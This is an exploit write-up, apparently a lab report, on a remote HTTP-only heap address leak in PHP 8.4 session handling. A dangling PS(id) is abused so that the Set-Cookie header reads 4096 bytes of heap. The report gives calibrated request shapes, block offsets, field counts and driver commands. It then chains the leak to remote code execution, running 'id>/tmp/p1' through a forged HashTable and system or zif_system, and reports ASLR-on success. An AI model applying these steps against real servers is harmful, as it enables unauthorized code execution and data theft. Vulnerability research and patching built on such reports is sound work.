# HTTP-Only Heap Address Leak: stale `PS(id)` + `Set-Cookie` Out-of-Bounds Read

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Constraints: **fully remote, HTTP-only; do not write any target-specific PHP file to the target webroot**. The target page contains only
`<?php echo "OK\n"; ?>` (no session calls; this leak does not depend on the script contents).
Status: **the heap address (Zend MM 2MB chunk base) leak is working**; the libphp/libc **code pointer**
leak is not yet complete; see Section 7 for the next step.

---

## 1. Conclusion

Using two HTTP-only requests, a **4096-byte heap out-of-bounds read** is obtained from the `Set-Cookie` response header:

- Request A: first, 1001 POST fields trigger the `max_input_vars` warning (`display_errors=On` outputs
  the warning and sets `SG(headers_sent)=1`), then a `PHPSESSID` whose value is a single byte `\x00`
  makes `php_session_initialize()` generate a new id and set `send_cookie=1`; subsequently,
  `php_session_reset_id()` **fails to send the cookie** because headers have already been sent, leaving `send_cookie`
  at 1. At the end of A, a 12MB field triggers OOM, leaving a dangling `PS(id)` (the
  `zend_string` of the random id).
- Request B: with no file field, the pre-RINIT upload-progress END cleanup calls
  `php_session_initialize()`; `php_session_reset_id()` sees `send_cookie=1` and
  the current request's headers not yet sent, so it uses the dangling `PS(id)` to construct
  `Set-Cookie: PHPSESSID=<url_encode(ZSTR_VAL(id), ZSTR_LEN(id))>`.
- B's multipart fields reoccupy the block left by A's `PS(id)` as a forged `zend_string` header:
  `len=0x1000`, with `data` pointing to offset 0x18 within the block. `php_url_encode` reads according to len,
  crosses the end of the block into the adjacent heap, and encodes the contents into `Set-Cookie`.

Measured (no-ASLR calibration):

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F...%F5%FF%7F...
cookie value 11548 characters (URL-encoded), 4096 bytes after decoding
98 0x7f.... pointers, all & ~0x1fffff == 0x7ffff5e00000
```

That is, **the Zend MM chunk base can be recovered directly from the HTTP response header**, without `/proc/self/maps`,
without target-side PHP, and without cooperation from the target application.

> This is orthogonal to the HTTP-only RCE chain in `NOASLR_REPORT.md`: leak request A fails before
> `track_init` (`reset_id` fails), so it **does not** leave a dangling `PS(http_session_vars)` reference;
> it is responsible only for leaving a dangling `PS(id)` and `send_cookie=1`.

---

## 2. Mechanism and Source Path

### 2.1 Leaving `send_cookie` at 1

`ext/session/session.c`:

```c
static zend_result php_session_initialize(void)
{
    ...
    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* empty id -> create new id */
        ...
        PS(id) = PS(mod)->s_create_sid(&PS(mod_data));
        ...
        if (PS(use_cookies)) {
            PS(send_cookie) = 1;
        }
    }
    ...
    if (php_session_reset_id() == FAILURE) {    /* fails here; track_init is not executed */
        php_session_abort();
        return FAILURE;
    }
    php_session_track_init();
    ...
}
```

`php_session_send_cookie()`:

```c
if (SG(headers_sent)) {
    php_error_docref(NULL, E_WARNING,
        "Session cookie cannot be sent after headers have already been sent");
    return FAILURE;
}
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

Key points:

1. **headers_sent must be 1**. This is achieved with the warning about exceeding `max_input_vars`:
   `main/php_variables.c` calls
   `php_error_docref(NULL, E_WARNING, "Input variables exceeded ...")` when the variable count exceeds 1000;
   the lab has `display_errors=On`, so the warning is written to the response and sets `SG(headers_sent)=1`.
2. **The first byte of id is 0**. The multipart `PHPSESSID` value is the single byte `\x00`:
   the FORMDATA branch of `php_session_rfc1867_callback` requires `value_len != 0`,
   so `progress->sid` is set to a string of length 1 containing `\0`; after
   `PS(id) = zend_string_init(progress->sid)` in FILE_START, `!ZSTR_VAL(PS(id))[0]`
   holds, entering the “create new id” branch and setting `send_cookie=1`.
3. `reset_id` fails due to headers_sent → `send_cookie` remains 1, and
   `php_session_track_init()` is not executed (so there is no `$_SESSION` reference).
4. At the end of A, a 12MB ordinary field triggers an OOM under `memory_limit=8M`; the bailout skips request
   shutdown, leaving `ps_globals.id` dangling (the 32-byte `zend_string` of the random id).

Measured after A (gdb, setarch -R):

```text
ps_globals.send_cookie = 1
ps_globals.id          = 0x7ffff5ea9000   (len=32, data0=0x35)
ps_globals.http_session_vars.type_info = 0 (UNDEF)
```

The response body also contains two key warnings, which can serve as a remote “preconditions satisfied” signal:

```html
Warning: PHP Request Startup: Input variables exceeded 1000...
Warning: PHP Request Startup: Session cookie cannot be sent after headers have already been sent
```

### 2.2 B: Sending `Set-Cookie` with the Dangling `PS(id)`

B has no file field, so it does not trigger FILE_START's `php_rinit_session(0)` (which would clear
the PS globals). multipart END event → `php_session_rfc1867_cleanup()` →
`php_session_initialize()` → `php_session_reset_id()`:

- `PS(use_cookies)=1` (default);
- `PS(send_cookie)=1` (left over from A);
- the headers for B's request have not been sent → the cookie is actually sent;
- `php_url_encode` reads with `ZSTR_LEN(PS(id))` as the length and `ZSTR_VAL(PS(id))` as the starting point.
  After the dangling block is reoccupied by B's fields, len/data are fully attacker-controlled.

### 2.3 Reoccupying the Dangling `PS(id)` Block

A's random id has length 32; `zend_string_alloc(32)` = 24+32+1 = 57 → **64-byte bin**;
in this lab's shape the block address is `chunk + 0xa9000` (no-ASLR: `0x7ffff5ea9000`).

B's multipart parsing re-pages the chunk at request startup. Calibration found that this stale address falls in an
**80-byte bin page** in B's layout:

1. First send N fields with value length 48 (`zend_string` = 24+48+1 = 73 → 80B bin).
   Each field leaves a **live** 80B string; these strings occupy blocks in free-list order.
2. Using a unique 48-character value per field (`v%04d` + `x`), it is possible to read out “which block lands at the stale address”:
   in this lab, with `N=998`, the `Set-Cookie` value is `v0892...`, meaning the string from field 893 lands in that block.
3. Instead, send **892** priming fields and then 1 forge field with a **79-byte value**:
   - raw buffer size 79+1 = 80 → 80B bin;
   - its value `zend_string` is 24+79+1 = 104 → 112B bin (does not occupy an 80B block);
   - the raw buffer takes exactly the “893rd 80B block” = the stale `PS(id)` block.
   Raw buffer content layout (block start is S, `PS(id)=S`):

   ```text
   S+0x00: gc (overwritten by the free-list next pointer after efree; no effect)
   S+0x08: h (arbitrary)
   S+0x10: len = 0x1000 (forged)
   S+0x18: data[0] = 'L', followed by padding
   ```

4. After the field is processed, the raw buffer is `efree()`d; Zend MM writes the free-list pointer only at block
   offset 0, and the len at `+0x10` is preserved. B's END cleanup then reads
   `ZSTR_LEN(PS(id)) = 0x1000` and performs URL encoding starting at `S+0x18`.

After `Set-Cookie` is sent, `php_session_valid_key()` in
`ps_files_open()` fails because the id contains illegal bytes, producing the warning
`Session ID is too long or contains illegal characters`—by this point the leak has already
been written to the response headers, so the warning does not affect the result.

---

## 3. Reproduction Steps

Environment (same as `NOASLR_REPORT.md`, with two additional points to note):

- `display_errors=On` (headers_sent depends on the warning actually being output);
- `session.use_cookies=1` (default; this lab was once set to 0 and needs to be changed back);
- `memory_limit=8M`, `session.use_strict_mode=0`, `session.save_path=/tmp`,
  `max_input_vars=1000` (default).

```bash
# Target host 172.16.0.103; ASLR on/off both work; the following are calibrated no-ASLR commands
cd ~/php2shell-work

# A: 1001 fields trigger the max_input_vars warning; PHPSESSID is a single byte \x00;
#    the file field triggers FILE_START; a 12MB field causes OOM
python3 send_a_leak2.py 1001 12

# B: 892 48-character numeric fields consume 80B blocks; the raw buffer of the last 79-byte-value field
#    lands in the dangling PS(id) block and forges len=0x1000
python3 b_numleak2.py 892 1 0x1000
```

Example B response headers (truncated):

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F%C3%A0%90%EA%F5%FF%7F...
...
Warning: PHP Request Startup: Session ID is too long or contains illegal characters.
```

Decoding and pointer extraction:

```bash
python3 tools/decode_leak.py logs/http_heap_leak_20261021.resp
# decoded=4096, candidate_ptrs=98, chunk_bases=7ffff5e00000:98
```

Raw response archive: `logs/http_heap_leak_20261021.resp`; analysis output:
`logs/http_heap_leak_20261021.txt`.

---

## 4. Calibration Data (This Build / This Request Shape)

| Item | Value |
|---|---|
| `PS(id)` after A (stale `zend_string`) | `0x7ffff5ea9000` = chunk + `0xa9000` |
| id length / block size | 32 / 64B bin |
| Bin containing the block after B reoccupies it | 80B |
| Number of priming 48-character fields (locating) | with `N=998`, value `v0892` lands in that block |
| Number of forge priming fields | `K=892` |
| Forge field value length | 79 (raw 80B) |
| Forged len | `0x1000` |
| B response `Set-Cookie` | 11548 characters (4096B decoded) |
| Leaked pointers | 98, all `0x7ffff5e…`, chunk base `0x7ffff5e00000` |

Supplementary (evidence of reuse at the same stale address):

- With `N=998` and unique 48-character values, the cookie value is `v0892...` (len=48)—showing that the block is
  reoccupied by a live 80B string;
- With numeric keys + short values (`b_numleak.py`), the cookie is still a normal 32-character id—showing that the block is not
  used; only an allocation sequence of live 80B strings/raw buffers can hit it.

---

## 5. Relationship to the ASLR Chain

This leak provides the **Zend MM chunk base**. In the same round of experiments, external addresses were used to verify:

- the calibrated HTTP-only A/B RCE chain succeeded **3/3** times with `personality=0` (ASLR on);
- it relies only on offsets relative to the chunk: `R0 = chunk + 0x24e0`, forged HT data =
  `chunk + 0x6e0d8` (the specific A/B shape is below);
- when the libc base was obtained externally via `/proc/<worker>/maps`, `system = libc + 0x4c490`,
  and the chain fully executed `id>/tmp/p1`.

That is, **the A/B memory chain itself is independent of ASLR**; only the “address source” is missing. The Set-Cookie
leak in this section supplies the heap base; still missing is a **libphp code pointer** (for `zif_system`,
libphp + `0x43a870`, with no libc needed) or a libc pointer.

### 5.1 No-ASLR Recalibration Also Obtained in This Round

On `172.16.0.103` (not 172.16.1.112 from the original report), the original report's fixed parameters do not apply directly:

```text
A: send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
B: send_b_rce2.py 16 2 0x7ffff5e6e0d8 0x7ffff7d14490 "id>/tmp/p1"
```

- 6 `7:7` pads move A's reference address to `0x7ffff5e024e0`;
  `R0-0x10=0x7ffff5e024d0` is exactly the start of a 56B block;
- B needs `N1=16` (31-character priming fields) for the 55B raw buffer to land at
  `R0-0x10`;
- on this host, libc `system = 0x7ffff7d14490` (offset `0x4c490`), forged HT data =
  `0x7ffff5e6e0d8`;
- proof: the contents of `/tmp/p1` are `uid=33(www-data) ...`.

---

## 6. Limitations

1. **`display_errors=On` is a precondition**. headers_sent comes from the warning output; if the target disables
   display_errors, the residual `send_cookie=1` state in this path does not hold (the current lab has it On).
2. `>1000` POST variables are required (default `max_input_vars=1000`) to trigger the warning;
   the request body is on the order of 1MB.
3. Requires `session.use_cookies=1` (default) and `session.use_strict_mode=0` (default 0).
4. The in-chunk offset (`0xa9000`), `N=998`, and `K=892` are tied to this build + this request shape;
   changing the PHP build / field length / boundary length requires remeasurement. They are all **chunk-relative offsets**
   and independent of ASLR.
5. The leak reads only toward higher addresses (starting at `PS(id)+0x18`). The current 4KB region is an 80B string page
   containing only heap pointers; a large 1MB leak (verified to be sendable) still shows only heap pointers, with no
   libphp/libc code pointers.
6. If len reads an uncontrolled value (for example a HashTable's `arData` / 64-bit hash),
   `safe_emalloc` in `php_url_encode` immediately raises a fatal error:
   `Possible integer overflow in memory allocation (3 * N + 32)`.
   This is itself a signal that “len is uncontrolled,” but no data is obtained.
7. Leak A does not produce a dangling `PS(http_session_vars)` reference (`reset_id` fails before
   `track_init`), so it cannot be merged with the RCE's A into a single request;
   the two are independent primitives that can be used in sequence on the same worker.

---

## 7. Next Step: Leaking a libphp Code Pointer

> **Follow-up progress on 2026-10-21 (completed)**: the goal of this section has been achieved, and the work
> was extended to HTTP-only ASLR-on RCE (two Set-Cookie leaks + `zif_system`), 5/5 in the lab. Method:
> A uses 1001 fields with 39-byte values to place the stale `PS(id)` at `chunk+0xb7400`; B uses 983
> nested arrays to expand the HashTable of `$_POST['a0443']` to 16 elements. `PS(id)+0x10` reads
> `nTableSize=16`, and the data region covers `nNextFreeElement` and `pDestructor`
> (`ZVAL_PTR_DTOR = libphp+0x613c50`). See [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) for the complete chain, payload, and driver.
> The original analysis is retained below.

Goal: obtain a libphp code address (for example the HashTable's
`pDestructor = ZVAL_PTR_DTOR`), and combine it with the known chunk base and g18's
Zend-only payload (`zif_system`, libphp + `0x43a870`) to achieve ASLR-on RCE **using only HTTP,
without externally supplied addresses**.

Confirmed experimental facts:

- With 998 `aNNNN[0]` nested-array fields, many 56B HashTable pages appear in B's chunk;
  a gdb scan (no-ASLR) shows these pages contain 73 libphp pointers/page,
  at offsets including `0x2000, 0x76000, 0x7b000, …, 0xa9000, 0xad000, 0xb2000, …`.
- The current stale `PS(id)` is at `chunk+0xa9000`; under nested-array B, this offset is exactly
  a 56B HashTable page. The problem becomes: **make the qword at `PS(id)+0x10` a
  moderate len rather than an `arData`/hash pointer**.
- Feasible directions (in priority order):
  1. Adjust A so that `PS(id)` lands at `HT + 0x18` (then
     `len = nNextFreeElement`, and data starts at `HT+0x30 = pDestructor`):
     this requires `PS(id) ≡ page + 0x18 (mod 56)`; from `PS(id)=page+64m`
     (A's 64B bin), `m ≡ 3 (mod 7)`, i.e. `page+0xc0`, `page+0x280`, etc.
     Scan A's field lengths/boundary lengths/file-field shapes for a reachable offset.
  2. Or make `PS(id)+0x10` land at `HT+0x20` (`len = nTableSize|nInternalPointer`):
     this requires `PS(id) ≡ page + 0x10 (mod 56)`, corresponding to `m ≡ 2 (mod 7)`
     (`page+0x80`, etc.), and make that HashTable's `nTableSize` large enough
     (for example 128 elements per array → len=128, enough to cover `pDestructor`).
  3. Move PS.id to a low offset in a libphp pointer page (such as `0x2000`)—this requires a smaller
     pre-heap in A or a different warning trigger method; currently 1001 fields put id at a minimum of about
     `0x61040`.
- After the libphp base is obtained, RCE B uses `zif_system` + a forged `zend_function`/
  `execute_data` (the Zend-only payload layout in `tools/d_aslr.php`) and
  needs only the chunk base + libphp base, not libc.

---

## 8. Files

| File | Purpose |
|---|---|
| `tools/send_a_leak2.py` | Leak A: 1001 fields + `max_input_vars` warning + empty/NUL PHPSESSID + file + OOM |
| `tools/send_a_leak3.py` | Leak A variant: adjustable field-name/value length and boundary length (used to move `PS(id)`) |
| `tools/b_numleak.py` | B: numeric keys, short values (used to confirm whether the stale block is overwritten) |
| `tools/b_numleak2.py` | **Final B**: 48-character values consume 80B blocks + a 79-byte forge field |
| `tools/b_consume.py` / `b_consume2.py` | 80B/64B block consumption experiments |
| `tools/b_nested.py` | Nested-array B (used to spread 56B HashTable pages throughout the chunk) |
| `tools/send_b_leak.py` | Early B (bare stale id / forged-header prototype) |
| `tools/decode_leak.py` | Decode `Set-Cookie`, extract pointers and chunk base |
| `tools/aslr_demo.sh` | ASLR-on verification: externally read maps, 3/3 proving the A/B chain's relative layout is stable |
| `logs/http_heap_leak_20261021.resp` | Raw leak response (4096B decoded / 11548-character cookie) |
| `logs/http_heap_leak_20261021.txt` | Decoded pointer list and chunk base statistics |

---

## 9. Disclaimer

For vulnerability research and reproduction in authorized environments only. The request shape, block offsets, and bin sequence are tied to this lab's
PHP 8.4.26 build and Apache/mod_php configuration; changing the build or configuration requires recalibration.
